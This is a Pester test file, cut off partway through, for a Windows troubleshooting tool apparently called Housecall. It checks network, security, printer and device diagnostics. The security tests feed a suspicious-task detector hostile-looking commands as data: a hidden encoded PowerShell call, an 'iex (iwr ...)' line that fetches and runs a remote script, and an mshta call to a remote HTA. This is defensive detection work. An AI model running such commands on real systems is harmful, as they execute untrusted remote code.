<#
    Run with the Pester that ships with Windows (3.4):

        powershell -ExecutionPolicy Bypass -Command "Invoke-Pester .\tests"
#>

$root = Split-Path -Parent $PSScriptRoot
. (Join-Path $root 'src\strings.ps1')
. (Join-Path $root 'src\ui.ps1')
. (Join-Path $root 'src\environment.ps1')
. (Join-Path $root 'src\menu.ps1')
. (Join-Path $root 'src\checks\common.ps1')
. (Join-Path $root 'src\checks\network.ps1')
. (Join-Path $root 'src\checks\email.ps1')
. (Join-Path $root 'src\checks\security.ps1')
. (Join-Path $root 'src\checks\devices.ps1')
. (Join-Path $root 'src\checks\audio-interop.ps1')
. (Join-Path $root 'src\checks\sound.ps1')
. (Join-Path $root 'src\checks\performance.ps1')
. (Join-Path $root 'src\checks\updates.ps1')
. (Join-Path $root 'src\fixes.ps1')
. (Join-Path $root 'src\note.ps1')
. (Join-Path $root 'src\relay.ps1')
. (Join-Path $root 'src\invoice.ps1')
. (Join-Path $root 'src\invoice-page.ps1')
. (Join-Path $root 'src\ai.ps1')

# Housecall's own source, put together the way dev.ps1 does it.
function Get-HcTestSource {
    $names = (Get-Content (Join-Path $root 'dev.ps1') | Where-Object { $_ -match "^\s+'([^']+\.ps1)'\s*$" }) -replace "^\s+'|'\s*$", ''
    ($names | ForEach-Object { [IO.File]::ReadAllText((Join-Path (Join-Path $root 'src') $_)) }) -join "`r`n"
}

# A clean PC on 26 Sep 2026; each scenario changes only what it is about.
function New-FakeSecurity {
    param([hashtable]$Change = @{})
    $f = [pscustomobject]@{
        Now = [datetime]'2026-09-26 10:00'; RemoteTools = @(); Tasks = @()
        Antivirus = [pscustomobject]@{ Known = $true; Name = 'Microsoft Defender'; Enabled = $true; Outdated = $false; DaysOld = 0; Threats = 0 }
        Notifications = @(); Proxy = $null; Hosts = @()
    }
    foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
    $f
}
function New-FakeTool {
    param([string]$Name = 'AnyDesk', $InstallDate = $null, [bool]$Running = $false, $Downloaded = $null, $LastUsed = $null)
    [pscustomobject]@{
        Name = $Name; Installed = [bool]$InstallDate; InstallDate = $InstallDate; Running = $Running
        AutoStart = $false; Downloaded = $Downloaded; LastUsed = $LastUsed
    }
}

# A healthy Wi-Fi PC; each scenario changes only what it is about.
function New-FakeFacts {
    param([hashtable]$Change = @{})
    $wifi = [pscustomobject]@{ Name = 'Wi-Fi'; Status = 'Up'; IsWifi = $true; IfIndex = 5 }
    $f = [pscustomobject]@{
        Adapters = @($wifi); Active = $wifi; Ssid = 'Ziggo-5G'; Signal = 82
        IPv4 = '192.168.178.34'; Dhcp = $true; Gateway = '192.168.178.1'; DnsServers = @('192.168.178.1')
        Proxy = $null; GatewayMs = 3; InternetMs = 38; DnsOk = $true; Web = 'ok'
    }
    foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
    $f
}
function New-FakeAdapter {
    param([string]$Status, [bool]$IsWifi = $true)
    [pscustomobject]@{ Name = $(if ($IsWifi) { 'Wi-Fi' } else { 'Ethernet' }); Status = $Status; IsWifi = $IsWifi; IfIndex = 7 }
}

Describe 'Resolve-HcChoice' {
    $cases = @(
        @{ In = '';        Area = '';  Kind = 'empty';    Value = $null }
        @{ In = '   ';     Area = '';  Kind = 'empty';    Value = $null }
        @{ In = 'a';       Area = '';  Kind = 'area';     Value = 'A' }
        @{ In = 'F';       Area = 'A'; Kind = 'area';     Value = 'F' }
        @{ In = 'A1';      Area = '';  Kind = 'problem';  Value = 'A1' }
        @{ In = ' c1 ';    Area = '';  Kind = 'problem';  Value = 'C1' }
        @{ In = 'F2';      Area = 'A'; Kind = 'problem';  Value = 'F2' }
        @{ In = '1';       Area = 'A'; Kind = 'problem';  Value = 'A1' }
        @{ In = '4';       Area = 'D'; Kind = 'problem';  Value = 'D4' }
        @{ In = '4';       Area = 'B'; Kind = 'unknown';  Value = '4' }
        @{ In = '1';       Area = '';  Kind = 'unknown';  Value = '1' }
        @{ In = 'A9';      Area = '';  Kind = 'unknown';  Value = 'A9' }
        @{ In = 'Z';       Area = '';  Kind = 'unknown';  Value = 'Z' }
        @{ In = '?';       Area = '';  Kind = 'ai';       Value = $null }
        @{ In = '0';       Area = 'A'; Kind = 'back';     Value = $null }
        @{ In = 'l';       Area = '';  Kind = 'language'; Value = $null }
        @{ In = 'q';       Area = 'C'; Kind = 'quit';     Value = $null }
        @{ In = 'my printer is broken'; Area = ''; Kind = 'freetext'; Value = 'my printer is broken' }
        @{ In = 'printer broken';       Area = ''; Kind = 'unknown';  Value = 'printer broken' }
    )
    foreach ($c in $cases) {
        It "reads '$($c.In)' in area '$($c.Area)' as $($c.Kind)" {
            $r = Resolve-HcChoice $c.In -CurrentArea $c.Area
            $r.Kind | Should Be $c.Kind
            $r.Value | Should Be $c.Value
        }
    }

    It 'reads U as undo' {
        (Resolve-HcChoice 'u').Kind | Should Be 'undo'
    }

    It 'never uses a reserved key as an area letter' {
        foreach ($reserved in @('?', '0', 'L', 'Q', 'U', 'S', 'H')) {
            $script:Areas.Contains($reserved) | Should Be $false
        }
    }
}

Describe 'Strings' {
    It 'has the same keys in English and Dutch' {
        $en = @($script:Strings.en.Keys | Sort-Object)
        $nl = @($script:Strings.nl.Keys | Sort-Object)
        (Compare-Object $en $nl | Measure-Object).Count | Should Be 0
    }

    It 'has a name for every area and problem, and a check list for every area' {
        foreach ($lang in @('en', 'nl')) {
            foreach ($letter in $script:Areas.Keys) {
                $script:Strings[$lang]["area.$letter"] | Should Not BeNullOrEmpty
                $script:Strings[$lang]["looks.$letter"] | Should Not BeNullOrEmpty
                foreach ($code in $script:Areas[$letter]) {
                    $script:Strings[$lang]["problem.$code"] | Should Not BeNullOrEmpty
                }
            }
        }
    }

    It 'fills placeholders and falls back for a missing key' {
        $script:Lang = 'nl'
        T 'ai.youTyped' 'hallo' | Should Be 'U typte: hallo'
        T 'no.such.key' | Should Be '[no.such.key]'
        $script:Lang = 'en'
    }
}

Describe 'A1: Test-HcInternet' {
    $script:Lang = 'en'
    $cases = @(
        @{ Name = 'everything works';               Change = @{};                                    Finding = 'allGood' }
        @{ Name = 'no adapter at all';              Change = @{ Adapters = @(); Active = $null };    Finding = 'noAdapter' }
        @{ Name = 'Wi-Fi switched off';             Change = @{ Adapters = @(New-FakeAdapter 'Disabled'); Active = $null };          Finding = 'wifiDisabled' }
        @{ Name = 'Wi-Fi on, not connected';        Change = @{ Adapters = @(New-FakeAdapter 'Disconnected'); Active = $null };      Finding = 'wifiNotConnected' }
        @{ Name = 'cable unplugged';                Change = @{ Adapters = @(New-FakeAdapter 'Disconnected' $false); Active = $null }; Finding = 'cableUnplugged' }
        @{ Name = 'cable adapter switched off';     Change = @{ Adapters = @(New-FakeAdapter 'Disabled' $false); Active = $null };   Finding = 'adapterOff' }
        @{ Name = 'no address from the router';     Change = @{ IPv4 = '169.254.12.7'; GatewayMs = $null; InternetMs = $null; DnsOk = $null; Web = $null }; Finding = 'noAddress' }
        @{ Name = 'no address and a weak signal';   Change = @{ IPv4 = $null; Signal = 20; InternetMs = $null };                    Finding = 'noAddress' }
        @{ Name = 'no gateway';                     Change = @{ Gateway = $null; InternetMs = $null };                             Finding = 'noGateway' }
        @{ Name = 'router down';                    Change = @{ GatewayMs = -1; InternetMs = -1 };                                 Finding = 'gatewayDown' }
        @{ Name = 'router ignores pings';           Change = @{ GatewayMs = -1 };                                                  Finding = 'allGood' }
        @{ Name = 'router up, no internet';         Change = @{ InternetMs = -1; DnsOk = $null; Web = $null };                     Finding = 'internetDown' }
        @{ Name = 'DNS broken';                     Change = @{ DnsOk = $false; Web = $null };                                     Finding = 'dnsDown' }
        @{ Name = 'login page catches the web';     Change = @{ Web = 'intercepted' };                                             Finding = 'webIntercepted' }
        @{ Name = 'proxy catches the web';          Change = @{ Web = 'failed'; Proxy = '127.0.0.1:8080' };                        Finding = 'proxy' }
        @{ Name = 'proxy set, web works';           Change = @{ Proxy = 'http://evil.example/proxy.pac' };                         Finding = 'proxy' }
        @{ Name = 'weak Wi-Fi';                     Change = @{ Signal = 25 };                                                      Finding = 'weakSignal' }
        @{ Name = 'on a cable';                     Change = @{ Active = (New-FakeAdapter 'Up' $false); Adapters = @(New-FakeAdapter 'Up' $false); Ssid = $null; Signal = $null }; Finding = 'allGood' }
    )
    foreach ($c in $cases) {
        It "finds '$($c.Finding)' when: $($c.Name)" {
            $r = Test-HcInternet (New-FakeFacts $c.Change)
            $r.FindingId | Should Be $c.Finding
        }
    }

    It 'shows no problem lines when everything works' {
        $r = Test-HcInternet (New-FakeFacts)
        @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
    }

    It 'skips what follows the broken link' {
        $r = Test-HcInternet (New-FakeFacts @{ InternetMs = -1; DnsOk = $null; Web = $null })
        $r.Results[-1].Status | Should Be 'skipped'
        @($r.Results | Where-Object { $_.Text -match 'DNS' }).Count | Should Be 0
    }

    It 'never shows a missing-string marker' {
        foreach ($c in $cases) {
            foreach ($lang in @('en', 'nl')) {
                $script:Lang = $lang
                $r = Test-HcInternet (New-FakeFacts $c.Change)
                @($r.Results | Where-Object { $_.Text -match '^\[' }).Count | Should Be 0
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'A2: Test-HcConnectionQuality' {
    $good = [pscustomobject]@{ Sent = 10; Lost = 0; AverageMs = 4 }

    It 'calls a healthy connection healthy' {
        (Test-HcConnectionQuality (New-FakeFacts) $good 3).FindingId | Should Be 'connHealthy'
    }
    It 'reports lost messages as unstable, with the percentage' {
        $r = Test-HcConnectionQuality (New-FakeFacts) ([pscustomobject]@{ Sent = 10; Lost = 3; AverageMs = 9 }) 3
        $r.FindingId | Should Be 'unstable'
        $r.FindingArgs[0] | Should Be 30
    }
    It 'reports many Wi-Fi drop-outs' {
        (Test-HcConnectionQuality (New-FakeFacts) $good 64).FindingId | Should Be 'dropsMany'
    }
    It 'puts a weak signal first' {
        (Test-HcConnectionQuality (New-FakeFacts @{ Signal = 30 }) ([pscustomobject]@{ Sent = 10; Lost = 5; AverageMs = 9 }) 3).FindingId | Should Be 'weakSignal'
    }
    It 'stops at the A1 answer when the internet is down' {
        (Test-HcConnectionQuality (New-FakeFacts @{ InternetMs = -1 }) $null $null).FindingId | Should Be 'internetDown'
    }
    It 'ignores drop-outs on a cable' {
        $cable = New-FakeAdapter 'Up' $false
        (Test-HcConnectionQuality (New-FakeFacts @{ Active = $cable; Adapters = @($cable) }) $good 99).FindingId | Should Be 'connHealthy'
    }
}

Describe 'A3: one website' {
    $names = @(
        @{ In = 'marktplaats.nl';                    Out = 'marktplaats.nl' }
        @{ In = ' https://www.Marktplaats.nl/a?b=1 '; Out = 'www.marktplaats.nl' }
        @{ In = 'http://mail.google.com:443/x';      Out = 'mail.google.com' }
        @{ In = 'whatsapp';                          Out = $null }
        @{ In = 'mijn bank';                         Out = $null }
    )
    foreach ($n in $names) {
        It "reads '$($n.In)' as '$($n.Out)'" { ConvertTo-HcHostName $n.In | Should Be $n.Out }
    }

    It 'finds a hosts-file line for the site or its www. twin, and ignores comments' {
        $hosts = Join-Path $TestDrive 'hosts'
        Set-Content $hosts @('# 127.0.0.1 bank.nl', '127.0.0.1 localhost', '', '0.0.0.0   www.marktplaats.nl   other.nl')
        Get-HcHostsEntry 'marktplaats.nl' $hosts | Should Be '0.0.0.0'
        Get-HcHostsEntry 'bank.nl' $hosts | Should Be $null
        Get-HcHostsEntry 'nu.nl' (Join-Path $TestDrive 'missing') | Should Be $null
    }

    $site = { param($c) $s = [pscustomobject]@{ Host = 'bank.nl'; HostsEntry = $null; Address = '1.2.3.4'; TcpMs = 12; HttpStatus = 200 }; foreach ($k in $c.Keys) { $s.$k = $c[$k] }; $s }
    $siteCases = @(
        @{ Name = 'site works';               Change = @{};                                         Finding = 'siteOk' }
        @{ Name = 'bot protection (403)';     Change = @{ HttpStatus = 403 };                      Finding = 'siteOk' }
        @{ Name = 'hosts file redirect';      Change = @{ HostsEntry = '0.0.0.0'; Address = '0.0.0.0'; TcpMs = -1 }; Finding = 'siteHosts' }
        @{ Name = 'name not found';           Change = @{ Address = $null; TcpMs = $null; HttpStatus = $null }; Finding = 'siteNotFound' }
        @{ Name = 'no answer on 443';         Change = @{ TcpMs = -1; HttpStatus = $null };        Finding = 'siteBlocked' }
        @{ Name = 'server error';             Change = @{ HttpStatus = 503 };                      Finding = 'siteError' }
        @{ Name = 'connects, sends nothing';  Change = @{ HttpStatus = 0 };                        Finding = 'siteBlocked' }
    )
    foreach ($c in $siteCases) {
        It "finds '$($c.Finding)' when: $($c.Name)" {
            (Test-HcSite (& $site $c.Change)).FindingId | Should Be $c.Finding
        }
    }
}

Describe 'F: Test-HcSecurity' {
    $script:Lang = 'en'
    $all = $script:SecurityChecks['F3'].Parts
    $cases = @(
        @{ Name = 'a clean PC';                          Change = @{};                                                                 Finding = 'cleanAll' }
        @{ Name = 'AnyDesk running right now';           Change = @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2024-01-01') -Running $true) }; Finding = 'remoteActive' }
        @{ Name = 'AnyDesk installed two days ago';      Change = @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24')) };  Finding = 'remoteRecent' }
        @{ Name = 'AnyDesk downloaded, never installed'; Change = @{ RemoteTools = @(New-FakeTool -Downloaded ([datetime]'2026-09-20')) };   Finding = 'remoteRecent' }
        @{ Name = 'AnyDesk removed, but used last week'; Change = @{ RemoteTools = @(New-FakeTool -LastUsed ([datetime]'2026-09-19')) };     Finding = 'remoteRecent' }
        @{ Name = 'TeamViewer installed years ago';      Change = @{ RemoteTools = @(New-FakeTool 'TeamViewer' ([datetime]'2021-03-02')) };  Finding = 'remoteOld' }
        @{ Name = 'virus protection off';                Change = @{ Antivirus = [pscustomobject]@{ Known = $true; Name = 'Microsoft Defender'; Enabled = $false; Outdated = $false; DaysOld = 0; Threats = 0 } }; Finding = 'defenderOff' }
        @{ Name = 'virus protection out of date';        Change = @{ Antivirus = [pscustomobject]@{ Known = $true; Name = 'Norton'; Enabled = $true; Outdated = $true; DaysOld = $null; Threats = $null } }; Finding = 'avOld' }
        @{ Name = 'threats stopped recently';            Change = @{ Antivirus = [pscustomobject]@{ Known = $true; Name = 'Microsoft Defender'; Enabled = $true; Outdated = $false; DaysOld = 0; Threats = 2 } }; Finding = 'threatsFound' }
        @{ Name = 'an encoded scheduled task';           Change = @{ Tasks = @([pscustomobject]@{ Name = 'Updater'; Command = 'powershell -enc SQBFAFgA'; Level = 'strong' }) }; Finding = 'suspiciousTask' }
        @{ Name = 'a hidden script task';                Change = @{ Tasks = @([pscustomobject]@{ Name = 'CourierAgent'; Command = 'wscript.exe x.vbs'; Level = 'weak' }) };     Finding = 'unknownTask' }
        @{ Name = 'sites may send notifications';        Change = @{ Notifications = @([pscustomobject]@{ Browser = 'Chrome'; Site = 'https://virus-alert.example'; Since = [datetime]'2026-09-21' }) }; Finding = 'notifySites' }
        @{ Name = 'a proxy';                             Change = @{ Proxy = '127.0.0.1:8888' };                                       Finding = 'proxy' }
        @{ Name = 'hosts redirects';                     Change = @{ Hosts = @('www.ing.nl -> 10.0.0.9') };                            Finding = 'hostsRedirect' }
        @{ Name = 'running tool beats everything else';  Change = @{ RemoteTools = @(New-FakeTool -Running $true); Proxy = 'x'; Antivirus = [pscustomobject]@{ Known = $true; Name = 'D'; Enabled = $false; Outdated = $false; DaysOld = 0; Threats = 0 } }; Finding = 'remoteActive' }
    )
    foreach ($c in $cases) {
        It "finds '$($c.Finding)' when: $($c.Name)" {
            (Test-HcSecurity (New-FakeSecurity $c.Change) $all 'cleanAll').FindingId | Should Be $c.Finding
        }
    }

    It 'dates a recent tool in the finding' {
        $r = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24')) }) @('remote') 'cleanCall'
        $r.FindingArgs[0] | Should Be 'AnyDesk'
        $r.FindingArgs[1] | Should Be '24 Sep 2026'
    }

    It 'marks a running or recent tool as a problem, an old one as check-this' {
        $recent = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24')) }) @('remote') 'cleanCall'
        $old = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2021-01-01')) }) @('remote') 'cleanCall'
        $recent.Results[0].Status | Should Be 'problem'
        $old.Results[0].Status | Should Be 'warn'
    }

    It 'lets well-known notification sites pass and flags only the rest' {
        $site = { param($s) [pscustomobject]@{ Browser = 'Brave'; Site = $s; Since = [datetime]'2026-09-20' } }
        $onlyKnown = @((& $site 'https://mail.google.com'), (& $site 'https://web.whatsapp.com'), (& $site 'http://localhost:5173'))
        (Test-HcSecurity (New-FakeSecurity @{ Notifications = $onlyKnown }) @('notifications') 'cleanPopup').FindingId | Should Be 'cleanPopup'

        $mixed = $onlyKnown + @((& $site 'https://mail.google.com.virus-alert.example'), (& $site 'https://robot-check.example'))
        $r = Test-HcSecurity (New-FakeSecurity @{ Notifications = $mixed }) @('notifications') 'cleanPopup'
        $r.FindingId | Should Be 'notifySites'
        $r.FindingArgs[0] | Should Be 2
    }

    It 'does not treat a look-alike domain as known' {
        Test-HcKnownSite 'https://calendar.google.com' | Should Be $true
        Test-HcKnownSite 'https://www.facebook.com' | Should Be $true
        Test-HcKnownSite 'https://mail.google.com.virus-alert.example' | Should Be $false
        Test-HcKnownSite 'https://notmarktplaats.nl' | Should Be $false
    }

    It 'uses each problem''s own clean finding' {
        (Test-HcSecurity (New-FakeSecurity) $script:SecurityChecks['F1'].Parts 'cleanPopup').FindingId | Should Be 'cleanPopup'
        (Test-HcSecurity (New-FakeSecurity) $script:SecurityChecks['F2'].Parts 'cleanCall').FindingId | Should Be 'cleanCall'
    }

    It 'never shows a missing-string marker, in either language' {
        foreach ($lang in @('en', 'nl')) {
            $script:Lang = $lang
            foreach ($c in $cases) {
                $r = Test-HcSecurity (New-FakeSecurity $c.Change) $all 'cleanAll'
                @($r.Results | Where-Object { $_.Text -match '\[\w+\.\w+\]' }).Count | Should Be 0
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'F: reading the PC' {
    $tasks = @(
        @{ Exe = 'powershell.exe';  Args = '-NoP -W Hidden -enc SQBFAFgA';                      Level = 'strong' }
        @{ Exe = 'powershell.exe';  Args = '-c "iex (iwr http://x.example/a.ps1)"';            Level = 'strong' }
        @{ Exe = 'mshta.exe';       Args = 'https://x.example/run.hta';                         Level = 'strong' }
        @{ Exe = 'C:\Users\Public\svc.exe'; Args = '';                                          Level = 'strong' }
        @{ Exe = 'wscript.exe';     Args = '"C:\Users\shami\AppData\Local\Reveille\start-agent-hidden.vbs"'; Level = 'weak' }
        @{ Exe = 'C:\Users\shami\AppData\Local\Programs\Opera GX\autoupdate\opera_autoupdate.exe'; Args = '--scheduledtask'; Level = $null }
        @{ Exe = 'shutdown.exe';    Args = '/r /fw /t 5';                                       Level = $null }
    )
    foreach ($t in $tasks) {
        It "rates '$($t.Exe) $($t.Args)' as $(if ($t.Level) { $t.Level } else { 'fine' })" {
            Get-HcTaskLevel $t.Exe $t.Args | Should Be $t.Level
        }
    }

    It 'reads install dates from the registry format' {
        ConvertFrom-HcInstallDate '20260924' | Should Be ([datetime]'2026-09-24')
        ConvertFrom-HcInstallDate '' | Should Be $null
        ConvertFrom-HcInstallDate '24-09-2026' | Should Be $null
    }

    It 'lists hosts-file redirects but not localhost' {
        $hosts = Join-Path $TestDrive 'hosts-f'
        Set-Content $hosts @('# comment', '127.0.0.1 localhost', '::1 localhost', '10.0.0.9 www.ing.nl ing.nl')
        @(Get-HcHostsRedirects $hosts) | Should Be @('www.ing.nl -> 10.0.0.9', 'ing.nl -> 10.0.0.9')
    }

    It 'has no remote tool pattern that matches everyday programs' {
        $everyday = @('Google Chrome', 'Microsoft Edge', 'Mozilla Firefox', 'VLC media player', 'Microsoft 365', 'LogMeIn Hamachi', 'Zoom Workplace', 'WhatsApp', 'Opera GX', 'Steam')
        foreach ($tool in $script:RemoteToolList | Where-Object { $_.Pattern }) {
            foreach ($name in $everyday) { $name -match $tool.Pattern | Should Be $false }
        }
    }
}

Describe 'C: printer and devices' {
    $script:Lang = 'en'
    $printer = { param($name, [hashtable]$c = @{})
        $p = [pscustomobject]@{ Name = $name; Default = $false; Virtual = $false; Offline = $false; State = 0; HostAddress = $null; Reachable = $null }
        foreach ($k in $c.Keys) { $p.$k = $c[$k] }
        $p }
    $pdf = & $printer 'Microsoft Print to PDF' @{ Virtual = $true }
    $hp = & $printer 'HP DeskJet 2700' @{ Default = $true }
    $facts = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ Now = [datetime]'2026-09-26 10:00'; SpoolerRunning = $true; SpoolerDisabled = $false; Printers = @($pdf, $hp); Jobs = @() }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }

    $cases = @(
        @{ Name = 'a ready default printer';          Change = @{};                                                                   Finding = 'printerReady' }
        @{ Name = 'the print service stopped';        Change = @{ SpoolerRunning = $false; Printers = @() };                           Finding = 'spoolerStopped' }
        @{ Name = 'only Print to PDF';                Change = @{ Printers = @($pdf) };                                              Finding = 'noPrinter' }
        @{ Name = 'Print to PDF is the default';      Change = @{ Printers = @((& $printer 'Microsoft Print to PDF' @{ Virtual = $true; Default = $true }), (& $printer 'HP DeskJet 2700')) }; Finding = 'defaultVirtual' }
        @{ Name = 'no default printer at all';        Change = @{ Printers = @($pdf, (& $printer 'HP DeskJet 2700')) };               Finding = 'noDefault' }
        @{ Name = 'the printer is offline';           Change = @{ Printers = @($pdf, (& $printer 'HP DeskJet 2700' @{ Default = $true; Offline = $true })) }; Finding = 'printerOffline' }
        @{ Name = 'a network printer not answering';  Change = @{ Printers = @($pdf, (& $printer 'HP DeskJet 2700' @{ Default = $true; HostAddress = '192.168.1.40'; Reachable = $false })) }; Finding = 'printerUnreachable' }
        @{ Name = 'out of paper';                     Change = @{ Printers = @($pdf, (& $printer 'HP DeskJet 2700' @{ Default = $true; State = 4 })) }; Finding = 'printerAttention' }
        @{ Name = 'low on ink only';                  Change = @{ Printers = @($pdf, (& $printer 'HP DeskJet 2700' @{ Default = $true; State = 5 })) }; Finding = 'printerReady' }
        @{ Name = 'documents stuck for an hour';      Change = @{ Jobs = @([pscustomobject]@{ Printer = 'HP DeskJet 2700'; Document = 'Brief.docx'; Submitted = [datetime]'2026-09-26 09:00'; Status = '' }) }; Finding = 'jobsStuck' }
        @{ Name = 'a document sent a minute ago';     Change = @{ Jobs = @([pscustomobject]@{ Printer = 'HP DeskJet 2700'; Document = 'Brief.docx'; Submitted = [datetime]'2026-09-26 09:59'; Status = '' }) }; Finding = 'printerReady' }
    )
    foreach ($c in $cases) {
        It "C1 finds '$($c.Finding)' when: $($c.Name)" {
            (Test-HcPrinter (& $facts $c.Change)).FindingId | Should Be $c.Finding
        }
    }

    It 'C1 offers the right fixes' {
        @((Test-HcPrinter (& $facts @{ SpoolerRunning = $false; Printers = @() })).Actions)[0].FixId | Should Be 'startSpooler'
        $r = Test-HcPrinter (& $facts @{ Printers = @((& $printer 'Microsoft Print to PDF' @{ Virtual = $true; Default = $true }), (& $printer 'HP DeskJet 2700')) })
        $r.Actions[0].FixId | Should Be 'setDefault'
        $r.Actions[0].Target.Name | Should Be 'HP DeskJet 2700'
        $r.Actions[0].Target.Previous | Should Be 'Microsoft Print to PDF'
        $stuck = Test-HcPrinter (& $facts @{ Jobs = @([pscustomobject]@{ Printer = 'x'; Document = 'd'; Submitted = [datetime]'2026-09-26 08:00'; Status = '' }) })
        @($stuck.Actions | ForEach-Object { $_.FixId }) | Should Be @('clearJobs', 'restartSpooler')
        @((Test-HcPrinter (& $facts)).Actions)[0].FixId | Should Be 'printTestPage'
    }

    $inputFacts = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ Problems = @(); Keyboards = 1; Pointers = 1; UsbDrives = @() }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    $device = { param($code) [pscustomobject]@{ Name = 'USB Receiver'; Class = 'HIDClass'; Code = $code; InstanceId = 'USB\VID_046D&PID_C52B\5&1' } }
    $inputCases = @(
        @{ Name = 'everything works';         Change = @{};                                                          Finding = 'devicesOk' }
        @{ Name = 'a device switched off';    Change = @{ Problems = @(& $device 22) };                             Finding = 'deviceDisabled' }
        @{ Name = 'a device without driver';  Change = @{ Problems = @(& $device 28) };                             Finding = 'deviceNoDriver' }
        @{ Name = 'a device reporting 43';    Change = @{ Problems = @(& $device 43) };                             Finding = 'deviceError' }
        @{ Name = 'no mouse';                 Change = @{ Pointers = 0 };                                            Finding = 'noPointer' }
        @{ Name = 'a USB stick, no letter';   Change = @{ UsbDrives = @([pscustomobject]@{ Name = 'SanDisk Cruzer'; Letters = @() }) }; Finding = 'usbNoLetter' }
        @{ Name = 'a USB stick as E:';        Change = @{ UsbDrives = @([pscustomobject]@{ Name = 'SanDisk Cruzer'; Letters = @('E:') }) }; Finding = 'devicesOk' }
    )
    foreach ($c in $inputCases) {
        It "C2 finds '$($c.Finding)' when: $($c.Name)" {
            (Test-HcInputDevices (& $inputFacts $c.Change)).FindingId | Should Be $c.Finding
        }
    }

    It 'C2 offers to switch a device back on, or restart it, by its instance id' {
        $off = Test-HcInputDevices (& $inputFacts @{ Problems = @(& $device 22) })
        $off.Actions[0].FixId | Should Be 'enableDevice'
        $off.Actions[0].Target.InstanceId | Should Be 'USB\VID_046D&PID_C52B\5&1'
        (Test-HcInputDevices (& $inputFacts @{ Problems = @(& $device 43) })).Actions[0].FixId | Should Be 'restartDevice'
        @((Test-HcInputDevices (& $inputFacts @{ Problems = @(& $device 28) })).Actions).Count | Should Be 0
    }

    $bt = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{
            Adapters = @([pscustomobject]@{ Name = 'TP-Link Bluetooth USB Adapter'; Code = 0; InstanceId = 'USB\VID_2357&PID_0604\1' })
            ServiceRunning = $true
            Paired = @([pscustomobject]@{ Name = 'JBL Charge Essential'; Connected = $false })
        }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    It 'C3 finds a working adapter, a missing one, a stopped service and a switched-off adapter' {
        (Test-HcBluetooth (& $bt)).FindingId | Should Be 'btOk'
        (Test-HcBluetooth (& $bt @{ Adapters = @() })).FindingId | Should Be 'btNoAdapter'
        $stopped = Test-HcBluetooth (& $bt @{ ServiceRunning = $false })
        $stopped.FindingId | Should Be 'btServiceStopped'
        $stopped.Actions[0].FixId | Should Be 'startBtService'
        $off = Test-HcBluetooth (& $bt @{ Adapters = @([pscustomobject]@{ Name = 'TP-Link Bluetooth USB Adapter'; Code = 22; InstanceId = 'USB\x' }) })
        $off.FindingId | Should Be 'deviceDisabled'
        $off.FindingArgs[0] | Should Be 'TP-Link Bluetooth USB Adapter'
    }

    It 'C3 lists paired devices with their connection state' {
        $r = Test-HcBluetooth (& $bt @{ Paired = @([pscustomobject]@{ Name = 'JBL Charge Essential'; Connected = $false }, [pscustomobject]@{ Name = 'Pro Controller'; Connected = $true }) })
        ($r.Results | Where-Object { $_.Text -like 'Paired:*' }).Text | Should Be 'Paired: JBL Charge Essential (not connected), Pro Controller (connected)'
    }

    It 'never shows a missing-string marker, in either language' {
        foreach ($lang in @('en', 'nl')) {
            $script:Lang = $lang
            $reports = @($cases | ForEach-Object { Test-HcPrinter (& $facts $_.Change) }) +
                       @($inputCases | ForEach-Object { Test-HcInputDevices (& $inputFacts $_.Change) }) +
                       @((Test-HcBluetooth (& $bt)), (Test-HcBluetooth (& $bt @{ ServiceRunning = $false })))
            foreach ($r in $reports) {
                @($r.Results | Where-Object { $_.Text -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
                @($r.Actions | ForEach-Object { Get-HcFixLabel $_ } | Where-Object { $_ -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'B: sound, video calls and screen' {
    $script:Lang = 'en'
    $out = { param($name, $default = $false, $muted = $false, $volume = 40)
        [pscustomobject]@{ Id = "id-$name"; Name = $name; IsDefault = $default; Muted = $muted; Volume = $volume } }
    $sound = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ ServiceRunning = $true; Problems = @()
            Outputs = @((& $out 'Speakers (Realtek(R) Audio)' $true), (& $out '2 - VG27AQML1A (AMD High Definition Audio Device)'), (& $out 'Headphones (Elgato Wave:3)')) }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }

    $soundCases = @(
        @{ Name = 'sound works';                   Change = @{};                                                         Finding = 'soundOk' }
        @{ Name = 'the sound service stopped';     Change = @{ ServiceRunning = $false };                               Finding = 'audioServiceStopped' }
        @{ Name = 'audio unreachable';             Change = @{ Outputs = $null };                                       Finding = 'audioServiceStopped' }
        @{ Name = 'no outputs at all';             Change = @{ Outputs = @() };                                          Finding = 'noOutput' }
        @{ Name = 'the speakers are muted';        Change = @{ Outputs = @((& $out 'Speakers' $true $true)) };           Finding = 'muted' }
        @{ Name = 'the volume is at 2%';           Change = @{ Outputs = @((& $out 'Speakers' $true $false 2)) };        Finding = 'volumeLow' }
        @{ Name = 'sound goes to the monitor';     Change = @{ Outputs = @((& $out 'Speakers'), (& $out 'LG TV (NVIDIA High Definition Audio)' $true)) }; Finding = 'defaultScreen' }
        @{ Name = 'only a monitor, it is default'; Change = @{ Outputs = @((& $out 'LG TV (NVIDIA High Definition Audio)' $true)) }; Finding = 'soundOk' }
        @{ Name = 'sound card switched off';       Change = @{ Problems = @([pscustomobject]@{ Name = 'Realtek Audio'; Class = 'MEDIA'; Code = 22; InstanceId = 'HDAUDIO\x' }) }; Finding = 'deviceDisabled' }
    )
    foreach ($c in $soundCases) {
